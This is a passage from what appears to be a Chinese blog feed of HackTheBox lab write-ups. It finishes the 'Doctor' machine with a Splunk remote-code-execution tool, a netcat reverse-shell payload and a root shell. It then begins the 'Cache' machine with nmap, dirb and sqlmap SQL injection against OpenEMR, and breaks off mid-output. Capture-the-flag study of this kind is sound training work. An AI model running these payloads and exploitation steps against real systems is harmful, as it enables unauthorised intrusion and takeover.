</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shaunå¯†ç [Guitar123]ï¼Œç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web@doctor:/var/log/apache2$ su shaun</span><br><span class="line">Password: </span><br><span class="line">shaun@doctor:/var/log/apache2$ whoami</span><br><span class="line">shaun</span><br><span class="line">shaun@doctor:/var/log/apache2$ </span><br><span class="line">shaun@doctor:/var/log/apache2$ cd</span><br><span class="line">shaun@doctor:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">shaun@doctor:~$ cat user.txt </span><br><span class="line">**************************************</span><br><span class="line">shaun@doctor:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-ææƒ"><a href="#0x05-ææƒ" class="headerlink" title="0x05.ææƒ"></a>0x05.ææƒ</h2><h3 id="1-shaunæ²¡æœ‰æƒé™"><a href="#1-shaunæ²¡æœ‰æƒé™" class="headerlink" title="1.shaunæ²¡æœ‰æƒé™"></a>1.shaunæ²¡æœ‰æƒé™</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shaun@doctor:/home/web$ sudo -l</span><br><span class="line">[sudo] password for shaun: </span><br><span class="line">Sorry, user shaun may not run sudo on doctor.</span><br><span class="line">shaun@doctor:/home/web$</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8xY2VhOTViYjM1OGM=">ä»€ä¹ˆæ˜¯splunk<i class="fa fa-external-link-alt"></i></span></p><h3 id="2-åˆ©ç”¨splunkææƒåœ°å€"><a href="#2-åˆ©ç”¨splunkææƒåœ°å€" class="headerlink" title="2.åˆ©ç”¨splunkææƒåœ°å€"></a>2.åˆ©ç”¨splunkææƒ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyLmdpdA==">åœ°å€<i class="fa fa-external-link-alt"></i></span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# git clone https://github.com/cnotin/SplunkWhisperer2</span><br><span class="line">æ­£å…‹éš†åˆ° &#x27;SplunkWhisperer2&#x27;...</span><br><span class="line">remote: Enumerating objects: 7, done.</span><br><span class="line">remote: Counting objects: 100% (7/7), done.</span><br><span class="line">remote: Compressing objects: 100% (6/6), done.</span><br><span class="line">remote: Total 55 (delta 1), reused 2 (delta 1), pack-reused 48</span><br><span class="line">å±•å¼€å¯¹è±¡ä¸­: 100% (55/55), 20.68 KiB | 162.00 KiB/s, å®Œæˆ.</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# ls</span><br><span class="line">nmap.CVT  SplunkWhisperer2  user</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor# cd SplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# ls</span><br><span class="line">LICENSE  PySplunkWhisperer2  README.md  SharpSplunkWhisperer2</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2# cd PySplunkWhisperer2/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# proxychains pip2 install -r requirements.txt </span><br><span class="line">ProxyChains-3.1 (http://proxychains.sf.net)</span><br><span class="line">|DNS-request| ::1 </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response|: ::1 does not exist</span><br><span class="line">DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support</span><br><span class="line">Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages (from -r requirements.txt (line 1)) (2.22.0)</span><br><span class="line">|DNS-request| pypi.org </span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">|DNS-response| pypi.org is 151.101.64.223</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-151.101.64.223:443-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">WARNING: You are using pip version 20.2.2; however, version 20.2.4 is available.</span><br><span class="line">You should consider upgrading via the &#x27;/usr/bin/python2 -m pip install --upgrade pip&#x27; command.</span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# ls</span><br><span class="line">build_exe.bat  PySplunkWhisperer2_local.py  PySplunkWhisperer2_remote.py  README.md  requirements.txt</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# chmod +x PySplunkWhisperer2_remote.py </span><br><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2#</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹ä½¿ç”¨æ–¹æ³•</code><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nub3Rpbi9TcGx1bmtXaGlzcGVyZXIyL2Jsb2IvbWFzdGVyL1B5U3BsdW5rV2hpc3BlcmVyMi9SRUFETUUubWQ=">readme<i class="fa fa-external-link-alt"></i></span></p><h3 id="3-kaliå…ˆç›‘å¬8888"><a href="#3-kaliå…ˆç›‘å¬8888" class="headerlink" title="3.kaliå…ˆç›‘å¬8888"></a>3.kaliå…ˆç›‘å¬8888</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-æ‰§è¡Œ"><a href="#4-æ‰§è¡Œ" class="headerlink" title="4.æ‰§è¡Œ"></a>4.æ‰§è¡Œ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2# python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.17.216 --username shaun --password Guitar123 --payload &#x27;nc.traditional -e/bin/bash &#x27;10.10.17.216&#x27; &#x27;8888&#x27;&#x27;</span><br><span class="line">Running in remote mode (Remote Code Execution)</span><br><span class="line">[.] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[.] Creating malicious app bundle...</span><br><span class="line">[+] Created malicious app bundle in: /tmp/tmpo7c3zpu6.tar</span><br><span class="line">[+] Started HTTP server for remote mode</span><br><span class="line">[.] Installing app from: http://10.10.17.216:8181/</span><br><span class="line">10.10.10.209 - - [18/Oct/2020 04:50:53] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">[+] App installed, your code should be running now!</span><br><span class="line"></span><br><span class="line">Press RETURN to cleanup</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-å¾—åˆ°shell"><a href="#5-å¾—åˆ°shell" class="headerlink" title="5.å¾—åˆ°shell"></a>5.å¾—åˆ°shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 49402</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">root@doctor:/# cd</span><br><span class="line">cd</span><br><span class="line">bash: cd: HOME not set</span><br><span class="line">root@doctor:/# ls</span><br><span class="line">ls</span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swapfile  usr</span><br><span class="line">root@doctor:/# ^Z       </span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 8888</span><br><span class="line">root@JIYE:~# stty raw -echo</span><br><span class="line">root@JIYE:~# nc -nvlp 8888</span><br><span class="line"></span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# </span><br><span class="line">root@doctor:/# cd /root/</span><br><span class="line">root@doctor:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@doctor:/root# cat root.txt </span><br><span class="line">***********************************</span><br><span class="line">root@doctor:/root#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00ç®€è¿°&quot;&gt;&lt;/a&gt;0x00ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/10/18/HTB-doctor/image-20201018151933161.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[cache]</title>
    <link href="https://lunamoore.github.io/2020/10/01/HTB-cache/"/>
    <id>https://lunamoore.github.io/2020/10/01/HTB-cache/</id>
    <published>2020-10-01T13:05:14.000Z</published>
    <updated>2020-10-01T13:15:18.187Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00.æ¦‚è¿°"></a>0x00.æ¦‚è¿°</h2><img src="/2020/10/01/HTB-cache/image-20201001085152007.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>ä»…ä»…å¼€æ”¾äº†22/80ç«¯å£</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# nmap -sC -sV -sT 10.10.10.188 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 05:02 EDT</span><br><span class="line">Nmap scan report for 10.10.10.188</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)</span><br><span class="line">|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)</span><br><span class="line">|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Cache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds</span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h2 id="0x02-å…ˆè®¿é—®80ç«¯å£"><a href="#0x02-å…ˆè®¿é—®80ç«¯å£" class="headerlink" title="0x02.å…ˆè®¿é—®80ç«¯å£"></a>0x02.å…ˆè®¿é—®80ç«¯å£</h2><h3 id="1-å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™"><a href="#1-å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™" class="headerlink" title="1.å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™"></a>1.å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªä»‹ç»hackerçš„ç½‘ç«™</h3><img src="/2020/10/01/HTB-cache/image-20201001091003205.png" class><h3 id="2-ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH"><a href="#2-ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH" class="headerlink" title="2.ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH"></a>2.ç‚¹å‡»authorå‘ç°ä½œè€…æ˜¯ASH</h3><img src="/2020/10/01/HTB-cache/image-20201001091126076.png" class><h3 id="3-å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­"><a href="#3-å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­" class="headerlink" title="3.å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­"></a>3.å°è¯•ä½¿ç”¨å¼±å£ä»¤ç™»å…¥ï¼Œè¿”å›ç»“æœä¸ºç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­</h3><img src="/2020/10/01/HTB-cache/image-20201001092153303.png" class><h3 id="4-å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥"><a href="#4-å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥" class="headerlink" title="4.å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥"></a>4.å‘ç°åŠŸèƒ½jsæ–‡ä»¶ï¼Œç‚¹å‡»å®¡æŸ¥</h3><img src="/2020/10/01/HTB-cache/image-20201001092439634.png" class><h3 id="5-å‘ç°ç”¨æˆ·åä¸å¯†ç "><a href="#5-å‘ç°ç”¨æˆ·åä¸å¯†ç " class="headerlink" title="5.å‘ç°ç”¨æˆ·åä¸å¯†ç "></a>5.å‘ç°ç”¨æˆ·åä¸å¯†ç </h3><img src="/2020/10/01/HTB-cache/image-20201001092533720.png" class><h2 id="0x03-ç™»å…¥"><a href="#0x03-ç™»å…¥" class="headerlink" title="0x03.ç™»å…¥"></a>0x03.ç™»å…¥</h2><p><code>è¿”å›ç»“æœä¾ç„¶æ˜¯æ­£åœ¨å»ºè®¾ä¸­</code></p><img src="/2020/10/01/HTB-cache/image-20201001092716509.png" class><h2 id="0x04-ä¿®æ”¹hostsæ–‡ä»¶"><a href="#0x04-ä¿®æ”¹hostsæ–‡ä»¶" class="headerlink" title="0x04.ä¿®æ”¹hostsæ–‡ä»¶"></a>0x04.ä¿®æ”¹hostsæ–‡ä»¶</h2><h3 id="1-å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•"><a href="#1-å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•" class="headerlink" title="1.å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•"></a>1.å‰é¢æç¤ºæŸ¥çœ‹ASHçš„å…¶ä»–é¡¹ç›®ä¾‹å¦‚HMSï¼Œæ‰€ä»¥æ·»åŠ ä¸€æ¡è®°å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.188    hms.htb</span><br></pre></td></tr></table></figure><h3 id="2-è®¿é—®hms-htb"><a href="#2-è®¿é—®hms-htb" class="headerlink" title="2.è®¿é—®hms.htb"></a>2.è®¿é—®hms.htb</h3><p><code>å°è¯•ashç™»å…¥ï¼Œä½†ç™»å…¥å¤±è´¥ï¼ŒCMSä¸ºOpenEmr</code></p><img src="/2020/10/01/HTB-cache/image-20201001151531806.png" class><h2 id="0x05-æ‰«æhms-htb"><a href="#0x05-æ‰«æhms-htb" class="headerlink" title="0x05.æ‰«æhms.htb"></a>0x05.æ‰«æhms.htb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# dirb http://hms.htb</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Oct  1 08:38:25 2020</span><br><span class="line">URL_BASE: http://hms.htb/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://hms.htb/ ----</span><br><span class="line">+ http://hms.htb/admin.php (CODE:200|SIZE:937)                                       </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/common/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/config/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/contrib/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/controllers/                                           </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/custom/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/images/                                              </span><br><span class="line">+ http://hms.htb/index.php (CODE:302|SIZE:0)                                         </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/interface/                                             </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/javascript/                                           </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/library/                                               </span><br><span class="line">+ http://hms.htb/LICENSE (CODE:200|SIZE:35147)                                       </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/modules/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/portal/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/public/                                               </span><br><span class="line">+ http://hms.htb/server-status (CODE:403|SIZE:272)                                   </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/services/                                             </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/sites/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/sql/                                                   </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/templates/                                            </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/tests/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/vendor/</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="0x06-æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•"><a href="#0x06-æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•" class="headerlink" title="0x06.æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•"></a>0x06.æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°protalç›®å½•</h2><p><code>Goolgeå‘ç°å­˜åœ¨sql injection</code><span class="exturl" data-url="aHR0cHM6Ly92aWRlby5oYWNraW5nLnJldmlld3MvMjAxOC8wOC9vcGVuZW1yLXNpbXVsYXRlZC1hdHRhY2suaHRtbA==">åœ°å€<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/10/01/HTB-cache/image-20201001154929030.png" class><img src="/2020/10/01/HTB-cache/image-20201001154952482.png" class><img src="/2020/10/01/HTB-cache/image-20201001155008570.png" class><h2 id="0x07-æŠ“åŒ…"><a href="#0x07-æŠ“åŒ…" class="headerlink" title="0x07.æŠ“åŒ…"></a>0x07.æŠ“åŒ…</h2><img src="/2020/10/01/HTB-cache/image-20201001155148152.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR=00b20ha34nukojgrtj0mvigfrk; PHPSESSID=ogdqnggoo752nheh5upb7qo5mo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h2 id="0x08-sqlmapåˆ©ç”¨"><a href="#0x08-sqlmapåˆ©ç”¨" class="headerlink" title="0x08.sqlmapåˆ©ç”¨"></a>0x08.sqlmapåˆ©ç”¨</h2><h3 id="1-å¾—åˆ°æ•°æ®åº“openemr"><a href="#1-å¾—åˆ°æ•°æ®åº“openemr" class="headerlink" title="1.å¾—åˆ°æ•°æ®åº“openemr"></a>1.å¾—åˆ°æ•°æ®åº“openemr</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# cat bp</span><br><span class="line">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR=00b20ha34nukojgrtj0mvigfrk; PHPSESSID=ogdqnggoo752nheh5upb7qo5mo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp --dbs --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.9#stable&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 09:53:26 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[09:53:26] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[09:53:26] [INFO] testing connection to the target URL</span><br><span class="line">[09:53:27] [WARNING] there is 